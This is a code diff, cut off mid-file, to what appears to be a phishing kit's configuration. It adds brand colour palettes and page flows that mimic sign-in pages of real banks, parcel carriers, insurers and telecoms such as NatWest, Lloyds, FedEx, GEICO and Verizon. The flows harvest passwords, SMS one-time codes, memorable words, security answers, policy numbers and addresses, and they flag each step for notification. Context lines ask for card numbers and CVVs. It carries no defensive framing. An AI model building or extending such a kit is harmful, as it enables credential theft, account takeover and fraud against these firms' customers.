@@ -1,11 +1,11 @@
 export const CATEGORIES = [
   { id: 'social',     name: 'Social Media',      count: 20 },
-  { id: 'government', name: 'Government',         count: 20 },
-  { id: 'banks',      name: 'Banks & Finance',    count: 30 },
+  { id: 'government', name: 'Government',         count: 27 },
+  { id: 'banks',      name: 'Banks & Finance',    count: 60 },
   { id: 'crypto',     name: 'Crypto',             count: 30 },
-  { id: 'payments',   name: 'Payments',           count: 30 },
+  { id: 'payments',   name: 'Payments',           count: 48 },
   { id: 'email',      name: 'Email',              count: 15 },
-  { id: 'tech',       name: 'Technology',         count: 25 },
+  { id: 'tech',       name: 'Technology',         count: 42 },
   { id: 'airlines',   name: 'Airlines',           count: 20 },
   { id: 'audio',      name: 'Music',              count: 30 },
   { id: 'video',      name: 'Video',              count: 30 }
@@ -98,6 +98,85 @@ const PALETTES = {
   qnb:            ['#8B0000','#600000','#FFFFFF','#8B0000','#D4AF37'],
   adcb:           ['#D71920','#A01218','#FFFFFF','#D71920','#FFD700'],
   fab:            ['#003087','#002060','#FFFFFF','#003087','#D4AF37'],
+
+  // ── NEW BANKS ────
+  capitalonebank:  ['#004977','#003357','#FFFFFF','#D03027','#004977'],
+  natwest:         ['#42145F','#2E0A45','#FFFFFF','#42145F','#DE006E'],
+  lloyds:          ['#024638','#01301F','#FFFFFF','#024638','#00B140'],
+  halifaxbank:     ['#0078A0','#005A78','#FFFFFF','#0078A0','#00B1EB'],
+  pncbank:         ['#F58025','#D46A10','#FFFFFF','#F58025','#273B7E'],
+  bmobank:         ['#0075BE','#00569A','#FFFFFF','#0075BE','#E31837'],
+  commonwealthbank:['#FFCC00','#D4A900','#000000','#FFCC00','#000000'],
+  regionsbank:     ['#006747','#004D34','#FFFFFF','#006747','#C8102E'],
+  keybank:         ['#CC0000','#990000','#FFFFFF','#CC0000','#000000'],
+  fifththirdbank:  ['#00833E','#006530','#FFFFFF','#00833E','#003865'],
+  citizensbank:    ['#008000','#005C00','#FFFFFF','#008000','#003D7A'],
+  huntingtonbank:  ['#00704A','#005236','#FFFFFF','#00704A','#C8102E'],
+  unicreditbank:   ['#DB0A2A','#A60820','#FFFFFF','#DB0A2A','#000000'],
+  intesasanpaolo:  ['#003366','#002244','#FFFFFF','#003366','#E4002B'],
+  societegenerale: ['#E60026','#B3001D','#FFFFFF','#E60026','#000000'],
+  creditagricole:  ['#008B5A','#006B43','#FFFFFF','#008B5A','#BF0A30'],
+  truistbank:      ['#4B286D','#361B52','#FFFFFF','#4B286D','#DA3088'],
+  mtbank:          ['#003087','#002060','#FFFFFF','#003087','#E31837'],
+  // ── SHIPPING ────
+  fedex:           ['#4D148C','#390E69','#FFFFFF','#FF6200','#4D148C'],
+  ups:             ['#351C15','#241009','#FFFFFF','#FFB500','#351C15'],
+  dhl:             ['#FFCC00','#D4A900','#D40511','#D40511','#000000'],
+  royalmail:       ['#D40511','#A00000','#FFFFFF','#D40511','#BF0A30'],
+  hermesevri:      ['#9B1D96','#7A1578','#FFFFFF','#9B1D96','#FFB300'],
+  dpd:             ['#D30032','#A00025','#FFFFFF','#D30032','#414042'],
+  parcelforce:     ['#FF0000','#CC0000','#FFFFFF','#FF0000','#414042'],
+  aramex:          ['#E00000','#B80000','#FFFFFF','#E00000','#000000'],
+  canadapost:      ['#CC0000','#990000','#FFFFFF','#CC0000','#FFCD00'],
+  australiapost:   ['#DA1710','#A81008','#FFFFFF','#DA1710','#FFB900'],
+  // ── INSURANCE ────
+  geico:           ['#003087','#002060','#FFFFFF','#003087','#C8102E'],
+  progressive:     ['#FFFFFF','#F5F5F5','#0047BB','#0047BB','#E31837'],
+  allstate:        ['#0033A0','#002278','#FFFFFF','#0033A0','#E31837'],
+  statefarm:       ['#CC0000','#990000','#FFFFFF','#CC0000','#003087'],
+  axainsurance:    ['#00008F','#000070','#FFFFFF','#00008F','#FF1721'],
+  aviva:           ['#1D1D1B','#0F0F0E','#FFFFFF','#0AC0E8','#0098B4'],
+  prudential:      ['#003087','#002060','#FFFFFF','#003087','#E31837'],
+  metlife:         ['#003087','#002060','#FFFFFF','#003087','#44BFFF'],
+  bluecross:       ['#003087','#002060','#FFFFFF','#003087','#0096D6'],
+  // ── TELECOM ────
+  attelecom:       ['#00A8E0','#0088C0','#000000','#00A8E0','#003087'],
+  verizon:         ['#CD040B','#A00006','#FFFFFF','#CD040B','#000000'],
+  tmobile:         ['#E20074','#B50059','#FFFFFF','#E20074','#000000'],
+  comcast:         ['#000000','#111111','#FFFFFF','#CC0000','#EF1C24'],
+  vodafone:        ['#E60000','#B30000','#FFFFFF','#E60000','#000000'],
+  o2telecom:       ['#003087','#002060','#FFFFFF','#003087','#009FE3'],
+  bttelecom:       ['#5514B4','#3D0E82','#FFFFFF','#5514B4','#00A9CE'],
+  deutschetelekom: ['#E20074','#B50059','#FFFFFF','#E20074','#000000'],
+  orangetelecom:   ['#FF6600','#CC4D00','#FFFFFF','#FF6600','#000000'],
+  // ── RETAIL ────
+  walmart:         ['#0071CE','#0058A4','#FFFFFF','#0071CE','#FFC220'],
+  ebay:            ['#E53238','#BB1B20','#FFFFFF','#0064D2','#F5AF02'],
+  targetstore:     ['#CC0000','#990000','#FFFFFF','#CC0000','#000000'],
+  bestbuy:         ['#003087','#002060','#FFFFFF','#003087','#FFE000'],
+  homedepot:       ['#F96302','#D55000','#FFFFFF','#F96302','#000000'],
+  costco:          ['#E31837','#B31229','#FFFFFF','#E31837','#003087'],
+  applestore:      ['#000000','#1C1C1E','#FFFFFF','#0A84FF','#30D158'],
+  aliexpress:      ['#FF4747','#D43535','#FFFFFF','#FF4747','#000000'],
+  etsy:            ['#F16521','#C8501A','#FFFFFF','#F16521','#000000'],
+  asos:            ['#FFFFFF','#F5F5F5','#000000','#000000','#F16521'],
+  // ── HEALTHCARE ────
+  unitedhealth:    ['#003087','#002060','#FFFFFF','#003087','#E31837'],
+  aetna:           ['#7B2D8B','#5C2168','#FFFFFF','#7B2D8B','#E31837'],
+  cigna:           ['#006E9A','#004F70','#FFFFFF','#006E9A','#E31837'],
+  kaiserpermanente:['#003DA5','#002B7A','#FFFFFF','#003DA5','#00A94F'],
+  cvshealth:       ['#CC0000','#990000','#FFFFFF','#CC0000','#003087'],
+  walgreens:       ['#E31837','#B31229','#FFFFFF','#E31837','#003087'],
+  // ── LEGAL / COURT ────
+  lawfirmglobal:   ['#1A1A2E','#12121F','#FFFFFF','#C8A96E','#B8914A'],
+  debtcollector:   ['#1A1A2E','#12121F','#FFFFFF','#CC0000','#A00000'],
+  courtbailiff:    ['#0D1B2A','#091220','#FFFFFF','#1F6FEB','#58A6FF'],
+  solicitoruk:     ['#2C3E50','#1A2B3C','#FFFFFF','#2980B9','#1A6FA8'],
+  federalcourtus:  ['#00205B','#001240','#FFFFFF','#C8102E','#003087'],
+  // ── GENERIC ────
+  genericofficial: ['#0D1B2A','#091220','#FFFFFF','#1F6FEB','#58A6FF'],
+  genericlegal:    ['#1A1A2E','#12121F','#FFFFFF','#C8A96E','#8B7340'],
+  genericfinancial:['#0A192F','#172A45','#CCDDF6','#64FFDA','#00B4D8'],
 
   binance:        ['#0B0E11','#1E2026','#EAECEF','#F0B90B','#FCD535'],
   coinbase:       ['#ffffff','#ffffff','#0a0b0d','#0052FF','#1652F0'],
@@ -510,6 +589,319 @@ const FLOWS = {
     { slug:'login',        form_type:'login',  page_title:'Sign In',           headline:'Sign in to FAB',                     subheadline:'',     fields:['customer_id','password'],         layout:'auth',  cta:'Sign In',   step_label:'Login',        notify_step:true  },
     { slug:'sms-otp',      form_type:'otp',    page_title:'OTP Verification',  headline:'Enter Verification Code',             subheadline:'We sent an OTP to your registered phone', fields:['code'],                           layout:'otp',   cta:'Confirm',   step_label:'OTP',          notify_step:true,  otp_length:6 },
     { slug:'confirm-card', form_type:'payment',page_title:'Confirm Card',      headline:'Confirm Card Details',                subheadline:'Enter your card details to verify',       fields:['card_number','expiry','cvv'],      layout:'payment',cta:'Confirm',   step_label:'Card Confirm', notify_step:true  }
+  ],
+
+  // ── NEW BANKS ────
+  capitalonebank: [
+    { slug:'login',      form_type:'login',      page_title:'Sign In',           headline:'Sign in to Capital One',             subheadline:'', fields:['username','password'],      layout:'auth',      cta:'Sign In',  step_label:'Login',      notify_step:true },
+    { slug:'sms-otp',    form_type:'otp',        page_title:'Verification',      headline:'Enter Verification Code',             subheadline:'We sent a code to your phone', fields:['code'],         layout:'otp',       cta:'Confirm', step_label:'SMS OTP',    notify_step:true, otp_length:6 },
+    { slug:'security-q', form_type:'security_q', page_title:'Security Questions',headline:'Security Questions',                  subheadline:'Answer to verify your identity', fields:['answer1','answer2'], layout:'security_q', cta:'Continue', step_label:'Security Q', notify_step:true }
+  ],
+  natwest: [
+    { slug:'login',   form_type:'login',  page_title:'Sign In',         headline:'Sign in to NatWest',                 subheadline:'', fields:['customer_number','password'], layout:'auth',   cta:'Sign In',  step_label:'Login',        notify_step:true },
+    { slug:'memo',    form_type:'verify', page_title:'Memorable Word',  headline:'Enter Your Memorable Word',           subheadline:'Enter characters from your memorable word', fields:['memorable_word'], layout:'verify', cta:'Continue', step_label:'Memorable Word', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',    page_title:'Verification',    headline:'Enter Verification Code',             subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'SMS OTP', notify_step:true, otp_length:6 }
+  ],
+  lloyds: [
+    { slug:'login',   form_type:'login',  page_title:'Sign In',               headline:'Sign in to Lloyds Bank',             subheadline:'', fields:['username','password'], layout:'auth',   cta:'Sign In',  step_label:'Login',         notify_step:true },
+    { slug:'memo',    form_type:'verify', page_title:'Memorable Information',  headline:'Enter Memorable Information',         subheadline:'Enter specific characters from your memorable information', fields:['memorable_word'], layout:'verify', cta:'Continue', step_label:'Memorable Info', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',    page_title:'Verification',           headline:'Enter Verification Code',             subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'SMS OTP', notify_step:true, otp_length:6 }
+  ],
+  halifaxbank: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to Halifax',             subheadline:'', fields:['username','password'], layout:'auth', cta:'Sign In', step_label:'Login',   notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',         subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'SMS OTP', notify_step:true, otp_length:6 }
+  ],
+  pncbank: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to PNC Bank',            subheadline:'', fields:['user_id','password'], layout:'auth', cta:'Sign In', step_label:'Login',   notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',         subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'SMS OTP', notify_step:true, otp_length:6 }
+  ],
+  bmobank: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to BMO',                 subheadline:'', fields:['username','password'], layout:'auth', cta:'Sign In', step_label:'Login',   notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',         subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'SMS OTP', notify_step:true, otp_length:6 }
+  ],
+  commonwealthbank: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',  headline:'Sign in to CommBank',                subheadline:'', fields:['client_number','password'], layout:'auth', cta:'Log On',  step_label:'Login',   notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'NetCode',  headline:'Enter NetCode',                      subheadline:'We sent a NetCode SMS to your registered phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'NetCode', notify_step:true, otp_length:6 }
+  ],
+  regionsbank: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to Regions',             subheadline:'', fields:['online_id','password'], layout:'auth', cta:'Sign In', step_label:'Login',   notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',         subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'SMS OTP', notify_step:true, otp_length:6 }
+  ],
+  keybank: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to KeyBank',             subheadline:'', fields:['username','password'], layout:'auth', cta:'Sign In', step_label:'Login',   notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',         subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'SMS OTP', notify_step:true, otp_length:6 }
+  ],
+  fifththirdbank: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to Fifth Third Bank',    subheadline:'', fields:['username','password'], layout:'auth', cta:'Sign In', step_label:'Login',   notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',         subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'SMS OTP', notify_step:true, otp_length:6 }
+  ],
+  citizensbank: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to Citizens Bank',       subheadline:'', fields:['username','password'], layout:'auth', cta:'Sign In', step_label:'Login',   notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',         subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'SMS OTP', notify_step:true, otp_length:6 }
+  ],
+  huntingtonbank: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to Huntington',          subheadline:'', fields:['username','password'], layout:'auth', cta:'Sign In', step_label:'Login',   notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',         subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'SMS OTP', notify_step:true, otp_length:6 }
+  ],
+  unicreditbank: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to UniCredit',           subheadline:'', fields:['username','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',         subheadline:'We sent a code to your registered phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  intesasanpaolo: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Accedi a Intesa Sanpaolo',       subheadline:'', fields:['username','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',         subheadline:'We sent a code to your registered phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  societegenerale: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to Société Générale',   subheadline:'', fields:['client_id','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',         subheadline:'We sent a code to your registered phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  creditagricole: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to Crédit Agricole',    subheadline:'', fields:['account_number','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',         subheadline:'We sent a code to your registered phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  truistbank: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to Truist',              subheadline:'', fields:['user_id','password'], layout:'auth', cta:'Sign In', step_label:'Login',   notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',         subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'SMS OTP', notify_step:true, otp_length:6 }
+  ],
+  mtbank: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to M&T Bank',            subheadline:'', fields:['username','password'], layout:'auth', cta:'Sign In', step_label:'Login',   notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',         subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'SMS OTP', notify_step:true, otp_length:6 }
+  ],
+
+  // ── SHIPPING ────
+  fedex: [
+    { slug:'login',          form_type:'login',  page_title:'Sign In',           headline:'Sign in to FedEx',                   subheadline:'', fields:['email','password'], layout:'auth',   cta:'Sign In',     step_label:'Login',    notify_step:true },
+    { slug:'verify-address', form_type:'verify', page_title:'Confirm Address',   headline:'Confirm Delivery Address',            subheadline:'Confirm or update the delivery address', fields:['address','city','state','zip'], layout:'verify', cta:'Confirm', step_label:'Address', notify_step:true },
+    { slug:'confirm',        form_type:'confirm',page_title:'Delivery Confirmed',headline:'Your Shipment Has Been Updated',       subheadline:'Your package delivery preferences have been saved', fields:[], layout:'confirm', cta:'View Status', step_label:'Complete', notify_step:false }
+  ],
+  ups: [
+    { slug:'login',          form_type:'login',  page_title:'Sign In',           headline:'Sign in to UPS',                     subheadline:'', fields:['email','password'], layout:'auth',   cta:'Sign In',      step_label:'Login',    notify_step:true },
+    { slug:'verify-address', form_type:'verify', page_title:'Confirm Address',   headline:'Confirm Your Delivery Address',        subheadline:'Verify your delivery address for this shipment', fields:['address','city','state','zip'], layout:'verify', cta:'Confirm', step_label:'Address', notify_step:true },
+    { slug:'confirm',        form_type:'confirm',page_title:'Request Submitted', headline:'Your Delivery Request Was Submitted',  subheadline:'', fields:[], layout:'confirm', cta:'Track Package', step_label:'Complete', notify_step:false }
+  ],
+  dhl: [
+    { slug:'login',          form_type:'login',  page_title:'Sign In',           headline:'Sign in to MyDHL+',                  subheadline:'', fields:['email','password'], layout:'auth',   cta:'Log In',       step_label:'Login',    notify_step:true },
+    { slug:'verify-address', form_type:'verify', page_title:'Confirm Address',   headline:'Confirm Delivery Address',            subheadline:'', fields:['address','city','postal','country'], layout:'verify', cta:'Confirm', step_label:'Address', notify_step:true },
+    { slug:'confirm',        form_type:'confirm',page_title:'Request Confirmed', headline:'Your Request Has Been Received',       subheadline:'DHL will attempt delivery to your updated address', fields:[], layout:'confirm', cta:'Track Parcel', step_label:'Complete', notify_step:false }
+  ],
+  royalmail: [
+    { slug:'login',          form_type:'login',  page_title:'Sign In',           headline:'Sign in to Royal Mail',              subheadline:'', fields:['email','password'], layout:'auth',   cta:'Sign In',      step_label:'Login',    notify_step:true },
+    { slug:'verify-address', form_type:'verify', page_title:'Confirm Address',   headline:'Confirm Your Address',                subheadline:'Enter your address to manage your delivery', fields:['address','city','postcode'], layout:'verify', cta:'Confirm', step_label:'Address', notify_step:true },
+    { slug:'confirm',        form_type:'confirm',page_title:'Request Submitted', headline:'Your Request Has Been Submitted',     subheadline:'', fields:[], layout:'confirm', cta:'Track Item', step_label:'Complete', notify_step:false }
+  ],
+  hermesevri: [
+    { slug:'login',          form_type:'login',  page_title:'Sign In',       headline:'Sign in to Evri',                    subheadline:'', fields:['email','password'], layout:'auth',   cta:'Sign In',      step_label:'Login',    notify_step:true },
+    { slug:'verify-address', form_type:'verify', page_title:'Confirm Address',headline:'Update Delivery Address',             subheadline:'', fields:['address','city','postcode'], layout:'verify', cta:'Confirm', step_label:'Address', notify_step:true },
+    { slug:'confirm',        form_type:'confirm',page_title:'Updated',        headline:'Delivery Address Updated',            subheadline:'', fields:[], layout:'confirm', cta:'Track Parcel', step_label:'Complete', notify_step:false }
+  ],
+  dpd: [
+    { slug:'login',          form_type:'login',  page_title:'Sign In',       headline:'Sign in to DPD',                     subheadline:'', fields:['email','password'], layout:'auth',   cta:'Sign In',      step_label:'Login',    notify_step:true },
+    { slug:'verify-address', form_type:'verify', page_title:'Confirm Address',headline:'Confirm Delivery Address',            subheadline:'', fields:['address','city','postcode'], layout:'verify', cta:'Confirm', step_label:'Address', notify_step:true },
+    { slug:'confirm',        form_type:'confirm',page_title:'Confirmed',      headline:'Your Preferences Have Been Saved',    subheadline:'', fields:[], layout:'confirm', cta:'Track Parcel', step_label:'Complete', notify_step:false }
+  ],
+  parcelforce: [
+    { slug:'login',          form_type:'login',  page_title:'Sign In',       headline:'Sign in to Parcelforce Worldwide',   subheadline:'', fields:['email','password'], layout:'auth',   cta:'Sign In',      step_label:'Login',    notify_step:true },
+    { slug:'verify-address', form_type:'verify', page_title:'Confirm Address',headline:'Confirm Your Delivery Address',       subheadline:'', fields:['address','city','postcode'], layout:'verify', cta:'Confirm', step_label:'Address', notify_step:true },
+    { slug:'confirm',        form_type:'confirm',page_title:'Confirmed',      headline:'Delivery Options Updated',            subheadline:'', fields:[], layout:'confirm', cta:'Track Parcel', step_label:'Complete', notify_step:false }
+  ],
+  aramex: [
+    { slug:'login',          form_type:'login',  page_title:'Sign In',       headline:'Sign in to Aramex',                  subheadline:'', fields:['email','password'], layout:'auth',   cta:'Sign In',       step_label:'Login',    notify_step:true },
+    { slug:'verify-address', form_type:'verify', page_title:'Confirm Address',headline:'Update Delivery Address',             subheadline:'', fields:['address','city','country'], layout:'verify', cta:'Confirm', step_label:'Address', notify_step:true },
+    { slug:'confirm',        form_type:'confirm',page_title:'Confirmed',      headline:'Your Address Has Been Updated',       subheadline:'', fields:[], layout:'confirm', cta:'Track Shipment', step_label:'Complete', notify_step:false }
+  ],
+  canadapost: [
+    { slug:'login',          form_type:'login',  page_title:'Sign In',       headline:'Sign in to Canada Post',             subheadline:'', fields:['email','password'], layout:'auth',   cta:'Sign In',       step_label:'Login',    notify_step:true },
+    { slug:'verify-address', form_type:'verify', page_title:'Confirm Address',headline:'Confirm Delivery Address',            subheadline:'', fields:['address','city','province','postal'], layout:'verify', cta:'Confirm', step_label:'Address', notify_step:true },
+    { slug:'confirm',        form_type:'confirm',page_title:'Request Submitted',headline:'Your Request Has Been Submitted',  subheadline:'', fields:[], layout:'confirm', cta:'Track Package', step_label:'Complete', notify_step:false }
+  ],
+  australiapost: [
+    { slug:'login',          form_type:'login',  page_title:'Sign In',       headline:'Sign in to Australia Post',          subheadline:'', fields:['email','password'], layout:'auth',   cta:'Sign In',       step_label:'Login',    notify_step:true },
+    { slug:'verify-address', form_type:'verify', page_title:'Confirm Address',headline:'Confirm Delivery Address',            subheadline:'', fields:['address','suburb','state','postcode'], layout:'verify', cta:'Confirm', step_label:'Address', notify_step:true },
+    { slug:'confirm',        form_type:'confirm',page_title:'Confirmed',      headline:'Your Delivery Has Been Updated',      subheadline:'', fields:[], layout:'confirm', cta:'Track Parcel', step_label:'Complete', notify_step:false }
+  ],
+
+  // ── INSURANCE ────
+  geico: [
+    { slug:'login',         form_type:'login',  page_title:'Sign In',       headline:'Sign in to GEICO',                   subheadline:'', fields:['email','password'], layout:'auth',   cta:'Sign In', step_label:'Login',  notify_step:true },
+    { slug:'policy-verify', form_type:'verify', page_title:'Verify Policy', headline:'Verify Your Policy',                  subheadline:'Enter your policy number and date of birth', fields:['policy_number','dob'], layout:'verify', cta:'Continue', step_label:'Policy', notify_step:true },
+    { slug:'sms-otp',       form_type:'otp',    page_title:'Verification',  headline:'Enter Verification Code',             subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  progressive: [
+    { slug:'login',         form_type:'login',  page_title:'Sign In',       headline:'Sign in to Progressive',             subheadline:'', fields:['username','password'], layout:'auth',   cta:'Sign In', step_label:'Login',  notify_step:true },
+    { slug:'policy-verify', form_type:'verify', page_title:'Verify Policy', headline:'Verify Your Policy',                  subheadline:'Enter your policy number to continue', fields:['policy_number'], layout:'verify', cta:'Continue', step_label:'Policy', notify_step:true },
+    { slug:'sms-otp',       form_type:'otp',    page_title:'Verification',  headline:'Enter Verification Code',             subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  allstate: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to Allstate',                subheadline:'', fields:['email','password'],    layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',             subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  statefarm: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to State Farm',              subheadline:'', fields:['username','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',             subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  axainsurance: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to AXA',                     subheadline:'', fields:['email','password'],    layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',             subheadline:'We sent a code to your registered phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  aviva: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to Aviva',                   subheadline:'', fields:['username','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',             subheadline:'We sent a code to your registered phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  prudential: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to Prudential',              subheadline:'', fields:['username','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',             subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  metlife: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to MetLife',                 subheadline:'', fields:['username','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',             subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  bluecross: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to Blue Cross Blue Shield',  subheadline:'', fields:['username','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',             subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+
+  // ── TELECOM ────
+  attelecom: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to AT&T',                    subheadline:'', fields:['user_id','password'],  layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',             subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  verizon: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to Verizon',                 subheadline:'', fields:['user_id','password'],  layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',             subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  tmobile: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to T-Mobile',                subheadline:'', fields:['email','password'],    layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',             subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  comcast: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to Xfinity',                 subheadline:'', fields:['username','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',             subheadline:'We sent a code to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  vodafone: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to Vodafone',                subheadline:'', fields:['email','password'],    layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Verification', headline:'Enter Verification Code',             subheadline:'We sent a code to your registered phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+  o2telecom: [
+    { slug:'login',   form_type:'login', page_title:'Sign In',      headline:'Sign in to O2',                      subheadline:'', fields:['email','password'],    layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
